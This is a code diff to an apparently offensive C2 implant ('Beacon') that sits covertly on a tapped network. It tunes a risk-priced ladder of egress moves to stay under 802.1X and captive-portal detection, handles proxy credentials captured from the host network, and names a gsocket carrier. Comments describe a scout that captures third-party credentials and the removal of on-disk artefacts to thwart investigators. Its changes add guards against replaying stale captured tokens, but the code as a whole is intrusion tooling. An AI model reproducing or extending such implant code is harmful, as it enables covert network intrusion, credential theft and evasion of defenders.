@@ -17,6 +17,7 @@ import http.client as http_client
 import io
 import json
 import logging
+import math
 import os
 import platform
 import random
@@ -2594,14 +2595,30 @@ def _way_out_keeps_a_ladder(policy: dict) -> None:
     moves, and from the *prior* detection probabilities: `dot1x_detect`
     may only raise rung 4's and `portal_detect` only lower rung 2's, both
     checked elsewhere, so the priors are the loud rungs' easiest case.
+
+    **And from the model's ceiling when the model is on.** `p_success`
+    is the one term a model may move, by `_WAY_OUT_CLAMP_SPAN`, and this
+    checked the prior alone -- so with `model.enabled` there were
+    accepted coefficients (16 to 24) and accepted thresholds (-8 to -5,
+    one line inside the documented meaning of that setting) under which
+    a model's estimate opened **rung 3** on the first cycle the decider
+    may act: an IP-phone-shaped device associating with a guest SSID with
+    no time dark at all, which is the "rescue that starts loud" this
+    design names as an anti-goal. Rung 4 was already safe, because
+    `_way_out_out_of_order` makes it wait for rung 3's prior and this
+    check requires that prior to be shut -- but "the loudest rung is
+    safe" was not the claim.
     """
     coefficient = float(policy["risk_coefficient"])
     threshold = float(policy["ev_threshold"])
+    reach = (_WAY_OUT_CLAMP_SPAN
+             if (policy.get("model") or {}).get("enabled") else 0.0)
     for rung in sorted(_WAY_OUT_ROW_OF):
         if rung <= _WAY_OUT_UNGATED_RUNG:
             continue
         row = _WAY_OUT_ROW_OF[rung]
-        points, success, detect = _WAY_OUT_ROWS[row]
+        points, prior, detect = _WAY_OUT_ROWS[row]
+        success = min(_WAY_OUT_P_MAX, prior + reach)
         if points * success - coefficient * detect > threshold:
             raise ValueError(
                 "c2.way_out's numbers put rung %d (%s) past the gate with "
@@ -2610,22 +2627,32 @@ def _way_out_keeps_a_ladder(policy: dict) -> None:
                 "moves would be available on the first cycle the decider "
                 "may act. The ladder needs elapsed time *and* repeated "
                 "failure: raise risk_coefficient (at least %d with these "
-                "rows) or raise ev_threshold"
+                "rows%s) or raise ev_threshold"
                 % (rung, row, points, success, coefficient, detect,
                    points * success - coefficient * detect, threshold,
-                   _way_out_least_coefficient(threshold)))
+                   _way_out_least_coefficient(threshold, reach),
+                   ", and this model's estimate" if reach else ""))
 
 
-def _way_out_least_coefficient(threshold: float) -> int:
-    """The smallest whole coefficient that keeps both loud rungs shut."""
+def _way_out_least_coefficient(threshold: float, reach: float = 0.0) -> int:
+    """The smallest whole coefficient that keeps both loud rungs shut.
+
+    A closed form and not a loop: `need` is derived from the operator's
+    own `points_max` and `ev_threshold`, neither of which has an upper
+    bound, so counting up by one took ten seconds at
+    `points_max: 200000000` and is linear from there -- on the startup
+    path of three processes, inside a reader whose whole stance is "log
+    a reason, hand back a disabled block, never cost a process its
+    loop". It must not be able to hang instead of printing its refusal.
+    """
     least = 1
     for rung, row in sorted(_WAY_OUT_ROW_OF.items()):
         if rung <= _WAY_OUT_UNGATED_RUNG:
             continue
-        points, success, detect = _WAY_OUT_ROWS[row]
+        points, prior, detect = _WAY_OUT_ROWS[row]
+        success = min(_WAY_OUT_P_MAX, prior + reach)
         need = (points * success - threshold) / detect
-        while least <= need:
-            least += 1
+        least = max(least, int(math.floor(need)) + 1)
     return least
 
 
@@ -7437,6 +7464,17 @@ class Beacon:
         self._rescue_answered = False
         self._stuck_cycles = 0
         self._egress_spent = 0
+        # **The stashed tapped path goes, though.** It holds the proxy and
+        # the `Proxy-Authorization` the borrow rung was using before the
+        # radio took over -- a third party's cleartext credential -- and
+        # the bind deliberately survives this call, so the stash survived
+        # with it: a rollback in a *later* outage put a weeks-old Basic
+        # token back on the session and replayed it against the host's
+        # proxy, which is how "an account that locks out" happens. Two
+        # guards exist to stop a capture crossing outages -- the borrow
+        # file's `written < opened` and the scout's own sweep -- and both
+        # are about the file, not about this copy in memory.
+        self._way_out_tapped_path = None
         # The one file this project puts on the disk goes with them: the
         # window is over, so the artefact that described it is removed
         # rather than left for the next reader -- or the next investigator
@@ -10155,6 +10193,8 @@ class Beacon:
         """
         if self._proxy_prohibited():
             return self._proxy_prohibition("re-running proxy discovery")
+        if self._way_out_source:
+            return self._way_out_off_path("re-running proxy discovery")
         found = self._proxy.discover_all()
         # Reported through `summary()`, which is also what `proxyinfo`
         # prints and what numbers the candidates. The numbering is the
@@ -10181,6 +10221,9 @@ class Beacon:
         target = (target or "").strip()
         if self._proxy_prohibited():
             return self._proxy_prohibition(
+                "selecting %r as this implant's proxy" % target)
+        if self._way_out_source:
+            return self._way_out_off_path(
                 "selecting %r as this implant's proxy" % target)
         if not target:
             return ("[error] 'egress proxy' takes an index or a URL from the "
@@ -10322,6 +10365,20 @@ class Beacon:
     # carry a secret -- which is why it is not the document the beacon
     # reads every cycle. Neither tests its own result.
 
+    def _way_out_off_path(self, what: str) -> str:
+        """Refuse a tapped-network move while the radio holds a lease.
+
+        The backstop under `_way_out_allows`' own refusal, for the
+        operator who types the verb by hand. Both exist because the
+        decider's path and the tasking path reach these verbs separately,
+        and round six's fix closed only one of the three doors into them.
+        """
+        return ("[error] Not %s: this implant is on its own radio at %s, "
+                "and a proxy, a credential or a portal the tap found is at "
+                "an address on the network this implant has left. Roll the "
+                "radio rung back first if the tapped port is the way out. "
+                "Nothing was changed." % (what, self._way_out_source))
+
     def _egress_borrow(self, what: str) -> Tuple[Optional[dict], str]:
         """The scout's private half, or a refusal naming what is missing.
 
@@ -10345,13 +10402,7 @@ class Beacon:
         own comment says must not leave the device.
         """
         if self._way_out_source:
-            return None, ("[error] Not borrowing %s: this implant is on its "
-                          "own radio at %s, and everything the scout "
-                          "captured is a fact about the tapped network -- a "
-                          "proxy and a portal at addresses that are not on "
-                          "this path. Roll the radio rung back first if the "
-                          "tapped port is the way out. Nothing was changed."
-                          % (what, self._way_out_source))
+            return None, self._way_out_off_path("borrowing %s" % what)
         if not self._way_out_state_dir:
             return None, ("[error] Not borrowing %s: c2.way_out is off on "
                           "this build, so no scout is watching the tapped "
@@ -11025,6 +11076,24 @@ class Beacon:
     # reason a proxy verb is dropped on a build that forbids proxies.
     _EGRESS_SCOUT_VERBS = ("credential", "portal")
 
+    # The rung-2 verbs that are **about the tapped network**, and are
+    # therefore not available while the radio rung holds a lease. A proxy
+    # the host uses sits at an RFC1918 address on the host's segment; the
+    # scout's credential and portal are at addresses on it; and discovery
+    # re-reads this host's own environment and fires `wpad` lookups out of
+    # the system resolver, which is the tapped port's.
+    #
+    # Refused **by the gate** and not only inside each verb, so the
+    # candidate walk moves on and no budget is spent: a refusal the build
+    # guarantees must not cost an attempt the quieter rules do not get.
+    # Each verb refuses as well, for the operator who types it by hand.
+    #
+    # `gsocket` is deliberately not here. It is a carrier rather than a
+    # path, its child process cannot take the bind at all, and its answer
+    # says so -- an operator who starts it while the radio holds a lease
+    # is told what they have done rather than refused.
+    _EGRESS_TAPPED_VERBS = ("proxy", "rediscover", "credential", "portal")
+
     # Which class each number is. `_RESCUE_CLASSES` maps the other way,
     # which is the direction the legs record in; this is the direction a
     # rule is read in, built from that same dict so that there is still
@@ -11387,6 +11456,21 @@ class Beacon:
                 "why": "rung %d needs the arithmetic that prices it, and "
                        "c2.way_out is off on this build, so it is refused "
                        "rather than taken unpriced" % rung}
+
+        if verb in self._EGRESS_TAPPED_VERBS and self._way_out_source:
+            # Not an arithmetic refusal: the rung has crossed and the
+            # move is simply about a network this implant has left. Round
+            # six closed this for `credential` and `portal` inside
+            # `_egress_borrow`; `proxy` and `rediscover` reached around
+            # it, which is the same defect through the third door.
+            return False, {
+                "rung": rung, "row": _WAY_OUT_ROW_OF[rung], "allowed": False,
+                "blocked_by": "the radio rung's lease",
+                "why": "rung %d's `egress %s` is about the tapped network, "
+                       "and this implant is on its own radio at %s -- a "
+                       "proxy, a credential or a portal there is at an "
+                       "address that is not on this path"
+                       % (rung, verb, self._way_out_source)}
 
         row = _WAY_OUT_ROW_OF[rung]
         _, prior_success, prior_detect = _WAY_OUT_ROWS[row]
